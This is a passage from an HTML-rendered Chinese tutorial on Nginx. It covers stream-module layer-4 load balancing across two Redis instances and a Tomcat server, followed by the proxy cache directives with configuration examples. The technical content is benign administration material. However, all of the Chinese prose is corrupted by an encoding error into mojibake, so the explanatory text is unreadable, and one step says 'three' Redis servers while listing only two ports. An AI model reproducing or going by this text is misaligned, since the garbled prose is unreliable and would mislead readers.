href="#nginxå››å±‚è´Ÿè½½å‡è¡¡"></a> Nginxå››å±‚è´Ÿè½½å‡è¡¡</h3><p>Nginxåœ¨1.9ä¹‹åï¼Œå¢åŠ äº†ä¸€ä¸ªstreamæ¨¡å—ï¼Œç”¨æ¥å®ç°å››å±‚åè®®çš„è½¬å‘ã€ä»£ç†ã€è´Ÿè½½å‡è¡¡ç­‰ã€‚streamæ¨¡å—çš„ç”¨æ³•è·Ÿhttpçš„ç”¨æ³•ç±»ä¼¼ï¼Œå…è®¸æˆ‘ä»¬é…ç½®ä¸€ç»„TCPæˆ–è€…UDPç­‰åè®®çš„ç›‘å¬ï¼Œç„¶åé€šè¿‡proxy_passæ¥è½¬å‘æˆ‘ä»¬çš„è¯·æ±‚ï¼Œé€šè¿‡upstreamæ·»åŠ å¤šä¸ªåç«¯æœåŠ¡ï¼Œå®ç°è´Ÿè½½å‡è¡¡ã€‚</p><p>å››å±‚åè®®è´Ÿè½½å‡è¡¡çš„å®ç°ï¼Œä¸€èˆ¬éƒ½ä¼šç”¨åˆ°LVSã€HAProxyã€F5ç­‰ï¼Œè¦ä¹ˆå¾ˆè´µè¦ä¹ˆé…ç½®å¾ˆéº»çƒ¦ï¼Œè€ŒNginxçš„é…ç½®ç›¸å¯¹æ¥è¯´æ›´ç®€å•ï¼Œæ›´èƒ½å¿«é€Ÿå®Œæˆå·¥ä½œã€‚</p><h4 id="æ·»åŠ streamæ¨¡å—çš„æ”¯æŒ"><a class="markdownIt-Anchor" href="#æ·»åŠ streamæ¨¡å—çš„æ”¯æŒ"></a> æ·»åŠ streamæ¨¡å—çš„æ”¯æŒ</h4><p>Nginxé»˜è®¤æ˜¯æ²¡æœ‰ç¼–è¯‘è¿™ä¸ªæ¨¡å—çš„ï¼Œéœ€è¦ä½¿ç”¨åˆ°streamæ¨¡å—ï¼Œé‚£ä¹ˆéœ€è¦åœ¨ç¼–è¯‘çš„æ—¶å€™åŠ ä¸Š<code>--with-stream</code>ã€‚</p><p>å®Œæˆæ·»åŠ <code>--with-stream</code>çš„å®ç°æ­¥éª¤:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">&gt;</span><span class="language-bash">å°†åŸæœ‰/usr/local/nginx/sbin/nginxè¿›è¡Œå¤‡ä»½</span><br><span class="hljs-meta prompt_">&gt;</span><span class="language-bash">æ‹·è´nginxä¹‹å‰çš„é…ç½®ä¿¡æ¯</span><br><span class="hljs-meta prompt_">&gt;</span><span class="language-bash">åœ¨nginxçš„å®‰è£…æºç è¿›è¡Œé…ç½®æŒ‡å®šå¯¹åº”æ¨¡å—  ./configure --with-stream</span><br><span class="hljs-meta prompt_">&gt;</span><span class="language-bash">é€šè¿‡makeæ¨¡æ¿è¿›è¡Œç¼–è¯‘</span><br><span class="hljs-meta prompt_">&gt;</span><span class="language-bash">å°†objsä¸‹é¢çš„nginxç§»åŠ¨åˆ°/usr/local/nginx/sbinä¸‹</span><br><span class="hljs-meta prompt_">&gt;</span><span class="language-bash">åœ¨æºç ç›®å½•ä¸‹æ‰§è¡Œ  make upgradeè¿›è¡Œå‡çº§ï¼Œè¿™ä¸ªå¯ä»¥å®ç°ä¸åœæœºæ·»åŠ æ–°æ¨¡å—çš„åŠŸèƒ½</span><br></code></pre></td></tr></table></figure><h4 id="nginxå››å±‚è´Ÿè½½å‡è¡¡çš„æŒ‡ä»¤"><a class="markdownIt-Anchor" href="#nginxå››å±‚è´Ÿè½½å‡è¡¡çš„æŒ‡ä»¤"></a> Nginxå››å±‚è´Ÿè½½å‡è¡¡çš„æŒ‡ä»¤</h4><h5 id="streamæŒ‡ä»¤"><a class="markdownIt-Anchor" href="#streamæŒ‡ä»¤"></a> streamæŒ‡ä»¤</h5><p>è¯¥æŒ‡ä»¤æä¾›åœ¨å…¶ä¸­æŒ‡å®šæµæœåŠ¡å™¨æŒ‡ä»¤çš„é…ç½®æ–‡ä»¶ä¸Šä¸‹æ–‡ã€‚å’ŒhttpæŒ‡ä»¤åŒçº§ã€‚</p><table><thead><tr><th>è¯­æ³•</th><th>stream { â€¦ }</th></tr></thead><tbody><tr><td>é»˜è®¤å€¼</td><td>â€”</td></tr><tr><td>ä½ç½®</td><td>main</td></tr></tbody></table><h5 id="upstreamæŒ‡ä»¤-2"><a class="markdownIt-Anchor" href="#upstreamæŒ‡ä»¤-2"></a> upstreamæŒ‡ä»¤</h5><p>è¯¥æŒ‡ä»¤å’Œhttpçš„upstreamæŒ‡ä»¤æ˜¯ç±»ä¼¼çš„ã€‚</p><h4 id="å››å±‚è´Ÿè½½å‡è¡¡çš„æ¡ˆä¾‹"><a class="markdownIt-Anchor" href="#å››å±‚è´Ÿè½½å‡è¡¡çš„æ¡ˆä¾‹"></a> å››å±‚è´Ÿè½½å‡è¡¡çš„æ¡ˆä¾‹</h4><h5 id="éœ€æ±‚åˆ†æ"><a class="markdownIt-Anchor" href="#éœ€æ±‚åˆ†æ"></a> éœ€æ±‚åˆ†æ</h5><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/1591897178807.png" alt="1591897178807" /></p><p>å®ç°æ­¥éª¤</p><p>(1)å‡†å¤‡RedisæœåŠ¡å™¨,åœ¨ä¸€æ¡æœåŠ¡å™¨ä¸Šå‡†å¤‡ä¸‰ä¸ªRedisï¼Œç«¯å£åˆ†åˆ«æ˜¯6379,6378</p><p>1.ä¸Šä¼ redisçš„å®‰è£…åŒ…ï¼Œ<code>redis-4.0.14.tar.gz</code></p><p>2.å°†å®‰è£…åŒ…è¿›è¡Œè§£å‹ç¼©</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">tar</span> -zxf redis-<span class="hljs-number">4</span>.<span class="hljs-number">0</span>.<span class="hljs-number">14</span>.tar.gz<br></code></pre></td></tr></table></figure><p>3.è¿›å…¥redisçš„å®‰è£…åŒ…</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">cd</span> redis-<span class="hljs-number">4</span>.<span class="hljs-number">0</span>.<span class="hljs-number">14</span><br></code></pre></td></tr></table></figure><p>4.ä½¿ç”¨makeå’Œinstallè¿›è¡Œç¼–è¯‘å’Œå®‰è£…</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">make PREFIX=<span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/redis/</span>redis01 install<br></code></pre></td></tr></table></figure><p>5.æ‹·è´redisé…ç½®æ–‡ä»¶<code>redis.conf</code>åˆ°/usr/local/redis/redis01/binç›®å½•ä¸­</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">cp redis.conf<span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/redis/</span>redis01/bin<br></code></pre></td></tr></table></figure><p>6.ä¿®æ”¹redis.confé…ç½®æ–‡ä»¶</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">port</span>  <span class="hljs-number">6379</span>      <span class="hljs-comment">#redisçš„ç«¯å£</span><br>daemonize <span class="hljs-literal">yes</span>   <span class="hljs-comment">#åå°å¯åŠ¨redis</span><br></code></pre></td></tr></table></figure><p>7.å°†redis01å¤åˆ¶ä¸€ä»½ä¸ºredis02</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> /usr/local/redis<br><span class="hljs-built_in">cp</span> -r redis01 redis02<br></code></pre></td></tr></table></figure><p>8.å°†redis02æ–‡ä»¶æ–‡ä»¶å¤¹ä¸­çš„redis.confè¿›è¡Œä¿®æ”¹</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">port</span>  <span class="hljs-number">6378</span>      <span class="hljs-comment">#redisçš„ç«¯å£</span><br>daemonize <span class="hljs-literal">yes</span>   <span class="hljs-comment">#åå°å¯åŠ¨redis</span><br></code></pre></td></tr></table></figure><p>9.åˆ†åˆ«å¯åŠ¨ï¼Œå³å¯è·å–ä¸¤ä¸ªRedis.å¹¶æŸ¥çœ‹</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">ps</span> -ef | <span class="hljs-keyword">grep</span> redis<br></code></pre></td></tr></table></figure><p>ä½¿ç”¨Nginxå°†è¯·æ±‚åˆ†å‘åˆ°ä¸åŒçš„RedisæœåŠ¡å™¨ä¸Šã€‚</p><p>(2)å‡†å¤‡TomcatæœåŠ¡å™¨.</p><p>1.ä¸Šä¼ tomcatçš„å®‰è£…åŒ…ï¼Œ<code>apache-tomcat-8.5.56.tar.gz</code></p><p>2.å°†å®‰è£…åŒ…è¿›è¡Œè§£å‹ç¼©</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">tar</span> -zxf apache-tomcat-<span class="hljs-number">8</span>.<span class="hljs-number">5</span>.<span class="hljs-number">56</span>.tar.gz<br></code></pre></td></tr></table></figure><p>3.è¿›å…¥tomcatçš„binç›®å½•</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> apache-tomcat-8.5.56/bin<br>./startup<br></code></pre></td></tr></table></figure><p>nginx.confé…ç½®</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-section">stream</span> &#123;<br>        <span class="hljs-section">upstream</span> redisbackend &#123;<br>                <span class="hljs-attribute">server</span> <span class="hljs-number">192.168.23.132:6379</span>;<br>                <span class="hljs-attribute">server</span> <span class="hljs-number">192.168.23.132:6378</span>;<br>        &#125;<br>        <span class="hljs-section">upstream</span> tomcatbackend &#123;<br>        <span class="hljs-attribute">server</span> <span class="hljs-number">192.168.23.132:8080</span>;<br>        &#125;<br>        <span class="hljs-section">server</span> &#123;<br>                <span class="hljs-attribute">listen</span>  <span class="hljs-number">81</span>;<br>                <span class="hljs-attribute">proxy_pass</span> redisbackend;<br>        &#125;<br>        <span class="hljs-section">server</span> &#123;<br>        <span class="hljs-attribute">listen</span><span class="hljs-number">82</span>;<br>        <span class="hljs-attribute">proxy_pass</span> tomcatbackend;<br>        &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>è®¿é—®æµ‹è¯•ã€‚</p><h1 id="nginxç¼“å­˜é›†æˆ"><a class="markdownIt-Anchor" href="#nginxç¼“å­˜é›†æˆ"></a> Nginxç¼“å­˜é›†æˆ</h1><h2 id="ç¼“å­˜çš„æ¦‚å¿µ"><a class="markdownIt-Anchor" href="#ç¼“å­˜çš„æ¦‚å¿µ"></a> ç¼“å­˜çš„æ¦‚å¿µ</h2><p>ç¼“å­˜å°±æ˜¯æ•°æ®äº¤æ¢çš„ç¼“å†²åŒº(ç§°ä½œ:Cache),å½“ç”¨æˆ·è¦è·å–æ•°æ®çš„æ—¶å€™ï¼Œä¼šå…ˆä»ç¼“å­˜ä¸­å»æŸ¥è¯¢è·å–æ•°æ®ï¼Œå¦‚æœç¼“å­˜ä¸­æœ‰å°±ä¼šç›´æ¥è¿”å›ç»™ç”¨æˆ·ï¼Œå¦‚æœç¼“å­˜ä¸­æ²¡æœ‰ï¼Œåˆ™ä¼šå‘è¯·æ±‚ä»æœåŠ¡å™¨é‡æ–°æŸ¥è¯¢æ•°æ®ï¼Œå°†æ•°æ®è¿”å›ç»™ç”¨æˆ·çš„åŒæ—¶å°†æ•°æ®æ”¾å…¥ç¼“å­˜ï¼Œä¸‹æ¬¡ç”¨æˆ·å°±ä¼šç›´æ¥ä»ç¼“å­˜ä¸­è·å–æ•°æ®ã€‚</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/1591944051969.png" alt="1591944051969" /></p><p>ç¼“å­˜å…¶å®åœ¨å¾ˆå¤šåœºæ™¯ä¸­éƒ½æœ‰ç”¨åˆ°ï¼Œæ¯”å¦‚ï¼š</p><table><thead><tr><th>åœºæ™¯</th><th>ä½œç”¨</th></tr></thead><tbody><tr><td>æ“ä½œç³»ç»Ÿç£ç›˜ç¼“å­˜</td><td>å‡å°‘ç£ç›˜æœºæ¢°æ“ä½œ</td></tr><tr><td>æ•°æ®åº“ç¼“å­˜</td><td>å‡å°‘æ–‡ä»¶ç³»ç»Ÿçš„IOæ“ä½œ</td></tr><tr><td>åº”ç”¨ç¨‹åºç¼“å­˜</td><td>å‡å°‘å¯¹æ•°æ®åº“çš„æŸ¥è¯¢</td></tr><tr><td>WebæœåŠ¡å™¨ç¼“å­˜</td><td>å‡å°‘å¯¹åº”ç”¨æœåŠ¡å™¨è¯·æ±‚æ¬¡æ•°</td></tr><tr><td>æµè§ˆå™¨ç¼“å­˜</td><td>å‡å°‘ä¸åå°çš„äº¤äº’æ¬¡æ•°</td></tr></tbody></table><p>ç¼“å­˜çš„ä¼˜ç‚¹</p><p>â€‹1.å‡å°‘æ•°æ®ä¼ è¾“ï¼ŒèŠ‚çœç½‘ç»œæµé‡ï¼ŒåŠ å¿«å“åº”é€Ÿåº¦ï¼Œæå‡ç”¨æˆ·ä½“éªŒï¼›</p><p>â€‹2.å‡è½»æœåŠ¡å™¨å‹åŠ›ï¼›</p><p>â€‹3.æä¾›æœåŠ¡ç«¯çš„é«˜å¯ç”¨æ€§ï¼›</p><p>ç¼“å­˜çš„ç¼ºç‚¹</p><p>â€‹1.æ•°æ®çš„ä¸ä¸€è‡´</p><p>â€‹2.å¢åŠ æˆæœ¬</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/1582295367198.png" alt="1582295367198" /></p><p>æœ¬æ¬¡è¯¾ç¨‹æ³¨è§£è®²è§£çš„æ˜¯Nginx,Nginxä½œä¸ºwebæœåŠ¡å™¨ï¼ŒNginxä½œä¸ºWebç¼“å­˜æœåŠ¡å™¨ï¼Œå®ƒä»‹äºå®¢æˆ·ç«¯å’Œåº”ç”¨æœåŠ¡å™¨ä¹‹é—´ï¼Œå½“ç”¨æˆ·é€šè¿‡æµè§ˆå™¨è®¿é—®ä¸€ä¸ªURLæ—¶ï¼Œwebç¼“å­˜æœåŠ¡å™¨ä¼šå»åº”ç”¨æœåŠ¡å™¨è·å–è¦å±•ç¤ºç»™ç”¨æˆ·çš„å†…å®¹ï¼Œå°†å†…å®¹ç¼“å­˜åˆ°è‡ªå·±çš„æœåŠ¡å™¨ä¸Šï¼Œå½“ä¸‹ä¸€æ¬¡è¯·æ±‚åˆ°æ¥æ—¶ï¼Œå¦‚æœè®¿é—®çš„æ˜¯åŒä¸€ä¸ªURLï¼Œwebç¼“å­˜æœåŠ¡å™¨å°±ä¼šç›´æ¥å°†ä¹‹å‰ç¼“å­˜çš„å†…å®¹è¿”å›ç»™å®¢æˆ·ç«¯ï¼Œè€Œä¸æ˜¯å‘åº”ç”¨æœåŠ¡å™¨å†æ¬¡å‘é€è¯·æ±‚ã€‚webç¼“å­˜é™ä½äº†åº”ç”¨æœåŠ¡å™¨ã€æ•°æ®åº“çš„è´Ÿè½½ï¼Œå‡å°‘äº†ç½‘ç»œå»¶è¿Ÿï¼Œæé«˜äº†ç”¨æˆ·è®¿é—®çš„å“åº”é€Ÿåº¦ï¼Œå¢å¼ºäº†ç”¨æˆ·çš„ä½“éªŒã€‚</p><h2 id="nginxçš„webç¼“å­˜æœåŠ¡"><a class="markdownIt-Anchor" href="#nginxçš„webç¼“å­˜æœåŠ¡"></a> Nginxçš„webç¼“å­˜æœåŠ¡</h2><p>Nginxæ˜¯ä»0.7.48ç‰ˆå¼€å§‹æä¾›ç¼“å­˜åŠŸèƒ½ã€‚Nginxæ˜¯åŸºäºProxy Storeæ¥å®ç°çš„ï¼Œå…¶åŸç†æ˜¯æŠŠURLåŠç›¸å…³ç»„åˆå½“åšKey,åœ¨ä½¿ç”¨MD5ç®—æ³•å¯¹Keyè¿›è¡Œå“ˆå¸Œï¼Œå¾—åˆ°ç¡¬ç›˜ä¸Šå¯¹åº”çš„å“ˆå¸Œç›®å½•è·¯å¾„ï¼Œä»è€Œå°†ç¼“å­˜å†…å®¹ä¿å­˜åœ¨è¯¥ç›®å½•ä¸­ã€‚å®ƒå¯ä»¥æ”¯æŒä»»æ„URLè¿æ¥ï¼ŒåŒæ—¶ä¹Ÿæ”¯æŒ404/301/302è¿™æ ·çš„é200çŠ¶æ€ç ã€‚Nginxå³å¯ä»¥æ”¯æŒå¯¹æŒ‡å®šURLæˆ–è€…çŠ¶æ€ç è®¾ç½®è¿‡æœŸæ—¶é—´ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨purgeå‘½ä»¤æ¥æ‰‹åŠ¨æ¸…é™¤æŒ‡å®šURLçš„ç¼“å­˜ã€‚</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/1591947990200.png" alt="1591947990200" /></p><h2 id="nginxç¼“å­˜è®¾ç½®çš„ç›¸å…³æŒ‡ä»¤"><a class="markdownIt-Anchor" href="#nginxç¼“å­˜è®¾ç½®çš„ç›¸å…³æŒ‡ä»¤"></a> Nginxç¼“å­˜è®¾ç½®çš„ç›¸å…³æŒ‡ä»¤</h2><p>Nginxçš„webç¼“å­˜æœåŠ¡ä¸»è¦æ˜¯ä½¿ç”¨<code>ngx_http_proxy_module</code>æ¨¡å—ç›¸å…³æŒ‡ä»¤é›†æ¥å®Œæˆï¼Œæ¥ä¸‹æ¥æˆ‘ä»¬æŠŠå¸¸ç”¨çš„æŒ‡ä»¤æ¥è¿›è¡Œä»‹ç»ä¸‹ã€‚</p><h3 id="proxy_cache_path"><a class="markdownIt-Anchor" href="#proxy_cache_path"></a> proxy_cache_path</h3><p>è¯¥æŒ‡å®šç”¨äºè®¾ç½®ç¼“å­˜æ–‡ä»¶çš„å­˜æ”¾è·¯å¾„</p><table><thead><tr><th>è¯­æ³•</th><th>proxy_cache_path path [levels=number] <br/>keys_zone=zone_name:zone_size [inactive=time][max_size=size];</th></tr></thead><tbody><tr><td>é»˜è®¤å€¼</td><td>â€”</td></tr><tr><td>ä½ç½®</td><td>http</td></tr></tbody></table><p><code>path</code>:ç¼“å­˜è·¯å¾„åœ°å€,å¦‚ï¼š</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/usr/</span>local/proxy_cache<br></code></pre></td></tr></table></figure><p><code>levels</code>: æŒ‡å®šè¯¥ç¼“å­˜ç©ºé—´å¯¹åº”çš„ç›®å½•ï¼Œæœ€å¤šå¯ä»¥è®¾ç½®3å±‚ï¼Œæ¯å±‚å–å€¼ä¸º1|2å¦‚ :</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs awk">levels=<span class="hljs-number">1</span>:<span class="hljs-number">2</span>   ç¼“å­˜ç©ºé—´æœ‰ä¸¤å±‚ç›®å½•ï¼Œç¬¬ä¸€æ¬¡æ˜¯<span class="hljs-number">1</span>ä¸ªå­—æ¯ï¼Œç¬¬äºŒæ¬¡æ˜¯<span class="hljs-number">2</span>ä¸ªå­—æ¯<br>ä¸¾ä¾‹è¯´æ˜:<br>itheima[key]é€šè¿‡MD5åŠ å¯†ä»¥åçš„å€¼ä¸º <span class="hljs-number">43</span>c8233266edce38c2c9af0694e2107d<br>levels=<span class="hljs-number">1</span>:<span class="hljs-number">2</span>   æœ€ç»ˆçš„å­˜å‚¨è·¯å¾„ä¸º<span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/proxy_cache/</span>d/<span class="hljs-number">07</span><br>levels=<span class="hljs-number">2</span>:<span class="hljs-number">1</span>:<span class="hljs-number">2</span> æœ€ç»ˆçš„å­˜å‚¨è·¯å¾„ä¸º<span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/proxy_cache/</span><span class="hljs-number">7</span>d<span class="hljs-regexp">/0/</span><span class="hljs-number">21</span><br>levels=<span class="hljs-number">2</span>:<span class="hljs-number">2</span>:<span class="hljs-number">2</span> æœ€ç»ˆçš„å­˜å‚¨è·¯å¾„ä¸º??<span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/proxy_cache/</span><span class="hljs-number">7</span>d<span class="hljs-regexp">/10/</span>e2<br></code></pre></td></tr></table></figure><p><code>keys_zone</code>:ç”¨æ¥ä¸ºè¿™ä¸ªç¼“å­˜åŒºè®¾ç½®åç§°å’ŒæŒ‡å®šå¤§å°ï¼Œå¦‚ï¼š</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">keys_zone</span>=itcast:<span class="hljs-number">200</span>m  ç¼“å­˜åŒºçš„åç§°æ˜¯itcast,å¤§å°ä¸º<span class="hljs-number">200</span>M,<span class="hljs-number">1</span>Må¤§æ¦‚èƒ½å­˜å‚¨<span class="hljs-number">8000</span>ä¸ªkeys<br></code></pre></td></tr></table></figure><p><code>inactive</code>:æŒ‡å®šç¼“å­˜çš„æ•°æ®å¤šæ¬¡æ—¶é—´æœªè¢«è®¿é—®å°±å°†è¢«åˆ é™¤ï¼Œå¦‚ï¼š</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">inactive</span><span class="hljs-operator">=</span><span class="hljs-number">1</span>d   ç¼“å­˜æ•°æ®åœ¨<span class="hljs-number">1</span>å¤©å†…æ²¡æœ‰è¢«è®¿é—®å°±ä¼šè¢«åˆ é™¤<br></code></pre></td></tr></table></figure><p><code>max_size</code>:è®¾ç½®æœ€å¤§ç¼“å­˜ç©ºé—´ï¼Œå¦‚æœç¼“å­˜ç©ºé—´å­˜æ»¡ï¼Œé»˜è®¤ä¼šè¦†ç›–ç¼“å­˜æ—¶é—´æœ€é•¿çš„èµ„æºï¼Œå¦‚:</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">max_size</span>=<span class="hljs-number">20</span>g<br></code></pre></td></tr></table></figure><p>é…ç½®å®ä¾‹:</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs routeros">http&#123;<br>proxy_cache_path /usr/local/proxy_cache <span class="hljs-attribute">keys_zone</span>=itcast:200m  <span class="hljs-attribute">levels</span>=1:2:1 <span class="hljs-attribute">inactive</span>=1d <span class="hljs-attribute">max_size</span>=20g;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="proxy_cache"><a class="markdownIt-Anchor" href="#proxy_cache"></a> proxy_cache</h3><p>è¯¥æŒ‡ä»¤ç”¨æ¥å¼€å¯æˆ–å…³é—­ä»£ç†ç¼“å­˜ï¼Œå¦‚æœæ˜¯å¼€å¯åˆ™è‡ªå®šä½¿ç”¨å“ªä¸ªç¼“å­˜åŒºæ¥è¿›è¡Œç¼“å­˜ã€‚</p><table><thead><tr><th>è¯­æ³•</th><th>proxy_cache zone_name|off;</th></tr></thead><tbody><tr><td>é»˜è®¤å€¼</td><td>proxy_cache off;</td></tr><tr><td>ä½ç½®</td><td>httpã€serverã€location</td></tr></tbody></table><p>zone_nameï¼šæŒ‡å®šä½¿ç”¨ç¼“å­˜åŒºçš„åç§°</p><h3 id="proxy_cache_key"><a class="markdownIt-Anchor" href="#proxy_cache_key"></a> proxy_cache_key</h3><p>è¯¥æŒ‡ä»¤ç”¨æ¥è®¾ç½®webç¼“å­˜çš„keyå€¼ï¼ŒNginxä¼šæ ¹æ®keyå€¼MD5å“ˆå¸Œå­˜ç¼“å­˜ã€‚</p><table><thead><tr><th>è¯­æ³•</th><th>proxy_cache_key key;</th></tr></thead><tbody><tr><td>é»˜è®¤å€¼</td><td>proxy_cache_key $scheme$proxy_host$request_uri;</td></tr><tr><td>ä½ç½®</td><td>httpã€serverã€location</td></tr></tbody></table><h3 id="proxy_cache_valid"><a class="markdownIt-Anchor" href="#proxy_cache_valid"></a> proxy_cache_valid</h3><p>è¯¥æŒ‡ä»¤ç”¨æ¥å¯¹ä¸åŒè¿”å›çŠ¶æ€ç çš„URLè®¾ç½®ä¸åŒçš„ç¼“å­˜æ—¶é—´</p><table><thead><tr><th>è¯­æ³•</th><th>proxy_cache_valid [code â€¦] time;</th></tr></thead><tbody><tr><td>é»˜è®¤å€¼</td><td>â€”</td></tr><tr><td>ä½ç½®</td><td>httpã€serverã€location</td></tr></tbody></table><p>å¦‚ï¼š</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs abnf">proxy_cache_valid <span class="hljs-number">200</span> <span class="hljs-number">302</span> <span class="hljs-number">10</span>m<span class="hljs-comment">;</span><br>proxy_cache_valid <span class="hljs-number">404</span> <span class="hljs-number">1</span>m<span class="hljs-comment">;</span><br>ä¸º<span class="hljs-number">200</span>å’Œ<span class="hljs-number">302</span>çš„å“åº”URLè®¾ç½®<span class="hljs-number">10</span>åˆ†é’Ÿç¼“å­˜ï¼Œä¸º<span class="hljs-number">404</span>çš„å“åº”URLè®¾ç½®<span class="hljs-number">1</span>åˆ†é’Ÿç¼“å­˜<br>proxy_cache_valid any <span class="hljs-number">1</span>m<span class="hljs-comment">;</span><br>å¯¹æ‰€æœ‰å“åº”çŠ¶æ€ç çš„URLéƒ½è®¾ç½®<span class="hljs-number">1</span>åˆ†é’Ÿç¼“å­˜<br></code></pre></td></tr></table></figure><h3 id="proxy_cache_min_uses"><a class="markdownIt-Anchor" href="#proxy_cache_min_uses"></a> proxy_cache_min_uses</h3><p>è¯¥æŒ‡ä»¤ç”¨æ¥è®¾ç½®èµ„æºè¢«è®¿é—®å¤šå°‘æ¬¡åè¢«ç¼“å­˜</p><table><thead><tr><th>è¯­æ³•</th><th>proxy_cache_min_uses number;</th></tr></thead><tbody><tr><td>é»˜è®¤å€¼</td><td>proxy_cache_min_uses 1;</td></tr><tr><td>ä½ç½®</td><td>httpã€serverã€location</td></tr></tbody></table><h3 id="proxy_cache_methods"><a class="markdownIt-Anchor" href="#proxy_cache_methods"></a> proxy_cache_methods</h3><p>è¯¥æŒ‡ä»¤ç”¨æˆ·è®¾ç½®ç¼“å­˜å“ªäº›HTTPæ–¹æ³•</p><table><thead><tr><th>è¯­æ³•</th><th>proxy_cache_methods GET|HEAD|POST;</th></tr></thead><tbody><tr><td>é»˜è®¤å€¼</td><td>proxy_cache_methods GET HEAD;</td></tr><tr><td>ä½ç½®</td><td>httpã€serverã€location</td></tr></tbody></table><p>é»˜è®¤ç¼“å­˜HTTPçš„GETå’ŒHEADæ–¹æ³•ï¼Œä¸ç¼“å­˜POSTæ–¹æ³•ã€‚</p><h2 id="nginxç¼“å­˜è®¾ç½®æ¡ˆä¾‹"><a class="markdownIt-Anchor" href="#nginxç¼“å­˜è®¾ç½®æ¡ˆä¾‹"></a> Nginxç¼“å­˜è®¾ç½®æ¡ˆä¾‹</h2><h4 id="éœ€æ±‚åˆ†æ-2"><a class="markdownIt-Anchor" href="#éœ€æ±‚åˆ†æ-2"></a> éœ€æ±‚åˆ†æ</h4><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/1591959569463.png" alt="1591959569463" /></p><h4 id="æ­¥éª¤å®ç°"><a class="markdownIt-Anchor" href="#æ­¥éª¤å®ç°"></a> æ­¥éª¤å®ç°</h4><p>1.ç¯å¢ƒå‡†å¤‡</p><p>åº”ç”¨æœåŠ¡å™¨çš„ç¯å¢ƒå‡†å¤‡</p><p>ï¼ˆ1ï¼‰åœ¨192.168.23.132æœåŠ¡å™¨ä¸Šçš„tomcatçš„webappsä¸‹é¢æ·»åŠ ä¸€ä¸ªjsç›®å½•ï¼Œå¹¶åœ¨jsç›®å½•ä¸­æ·»åŠ ä¸€ä¸ªjquery.jsæ–‡ä»¶</p><p>ï¼ˆ2ï¼‰å¯åŠ¨tomcat</p><p>ï¼ˆ3ï¼‰è®¿é—®æµ‹è¯•</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">23.132</span>:<span class="hljs-number">8080</span><span 